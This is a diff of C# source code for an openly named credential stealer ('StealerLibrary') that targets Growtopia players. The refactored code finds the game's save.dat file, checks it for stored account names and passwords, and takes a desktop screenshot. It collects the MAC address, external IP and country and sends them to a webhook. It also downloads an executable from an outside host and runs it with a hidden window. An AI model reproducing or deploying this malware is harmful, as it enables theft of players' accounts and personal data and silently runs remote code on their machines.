@@ -34,11 +34,7 @@ namespace StealerLibrary
                 string Culture = CultureInfo.CurrentCulture.EnglishName;
                 string GetCountry = Culture.Substring(Culture.IndexOf('(') + 1, Culture.LastIndexOf(')') - Culture.IndexOf('(') - 1);
                 string screen = Path.GetTempPath() + "screen.jpg";
-                String MACAddress = NetworkInterface
-               .GetAllNetworkInterfaces()
-               .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)
-               .Select(nic => nic.GetPhysicalAddress().ToString())
-               .FirstOrDefault();
+                string MACAddress = NetworkInterface.GetAllNetworkInterfaces().Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback).Select(nic => nic.GetPhysicalAddress().ToString()).FirstOrDefault();
 
                 Webhook hook = new Webhook(WebhookUrl);
                 hook.Name = WebhookName;
@@ -80,7 +76,7 @@ namespace StealerLibrary
                 if (Screenshot)
                 {
                     TakeScreenshot();
-                    details += "Screenshot:";
+                    details += "Desktop Screenshot:";
                     hook.SendMessage(details, screen);
                     DeleteTempFiles();
                     return;
@@ -114,7 +110,7 @@ namespace StealerLibrary
                 {
                     g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                 }
-                bitmap.Save(System.IO.Path.GetTempPath() + "screen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
+                bitmap.Save(Path.GetTempPath() + "screen.jpg", System.Drawing.Imaging.ImageFormat.Jpeg);
             }
         }
         #endregion
@@ -124,9 +120,7 @@ namespace StealerLibrary
         {
             try
             {
-                string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
-                var externalIp = IPAddress.Parse(externalIpString);
-                return externalIp.ToString();
+                return new WebClient().DownloadString("http://icanhazip.com").Trim();
             }
             catch
             {
@@ -143,14 +137,12 @@ namespace StealerLibrary
                 if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\save.dat"))
                 {
                     WebClient wc = new WebClient();
-
                     wc.DownloadFile("http://anarchy.5v.pl/savedec.exe", Path.GetTempPath() + "\\savedec.exe");
-
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = Path.GetTempPath() + "\\savedec.exe",
-                        WindowStyle = ProcessWindowStyle.Hidden
-                    }).WaitForExit();
+                    Process savedec = new Process();
+                    savedec.StartInfo.FileName = Path.GetTempPath() + "\\savedec.exe";
+                    savedec.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                    savedec.Start();
+                    savedec.WaitForExit();
                 }
             }
             catch
@@ -162,52 +154,44 @@ namespace StealerLibrary
         #region Save.dat Path
         public static string SaveDatPath()
         {
-            string text = "";
+            string SaveDatPath;
             try
             {
-                RegistryKey registryKey;
+                RegistryKey Registry;
                 if (Environment.Is64BitOperatingSystem)
                 {
-                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
+                    Registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                 }
                 else
                 {
-                    registryKey = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
+                    Registry = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                 }
-                try
+                Registry = Registry.OpenSubKey("Software\\Growtopia", true);
+                string path = (string)Registry.GetValue("path");
+                if (Directory.Exists(path))
                 {
-                    registryKey = registryKey.OpenSubKey("Software\\Growtopia", true);
-                    string text2 = (string)registryKey.GetValue("path");
-                    if (Directory.Exists(text2))
+                    string SaveDat = File.ReadAllText(path + "\\save.dat");
+                    if (SaveDat.Contains("tankid_password") && SaveDat.Contains("tankid_name"))
                     {
-                        string text3 = File.ReadAllText(text2 + "\\save.dat");
-                        if (text3.Contains("tankid_password") && text3.Contains("tankid_name"))
-                        {
-                            text = text2 + "\\save.dat";
-                            return text;
-                        }
-                        else
-                        {
-                            text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
-                            return text;
-                        }
+                        SaveDatPath = path + "\\save.dat";
+                        return SaveDatPath;
                     }
                     else
                     {
-                        text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
-                        return text;
+                        SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                        return SaveDatPath;
                     }
                 }
-                catch
+                else
                 {
-                    text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
-                    return text;
+                    SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                    return SaveDatPath;
                 }
             }
             catch
             {
-                text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
-                return text;
+                SaveDatPath = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\save.dat";
+                return SaveDatPath;
             }
         }
         #endregion
@@ -217,24 +201,24 @@ namespace StealerLibrary
         {
             try
             {
-                byte[] array = File.ReadAllBytes(path);
-                string @string = Encoding.ASCII.GetString(array);
-                string lastworld;
+                byte[] Array = File.ReadAllBytes(path);
+                string GetString = Encoding.ASCII.GetString(Array);
+                string LastWorld;
                 try
                 {
-                    string text = @string.Substring(@string.IndexOf("lastworld") + 13, Convert.ToInt32(array[@string.IndexOf("lastworld") + 9]));
-                    lastworld = text;
+                    string text = GetString.Substring(GetString.IndexOf("lastworld") + 13, Convert.ToInt32(Array[GetString.IndexOf("lastworld") + 9]));
+                    LastWorld = text;
                 }
                 catch
                 {
-                    lastworld = "N/A";
+                    LastWorld = "N/A";
                 }
-                return lastworld;
+                return LastWorld;
             }
             catch
             {
-                string lastworld = "N/A";
-                return lastworld;
+                string LastWorld = "N/A";
+                return LastWorld;
             }
         }
         #endregion
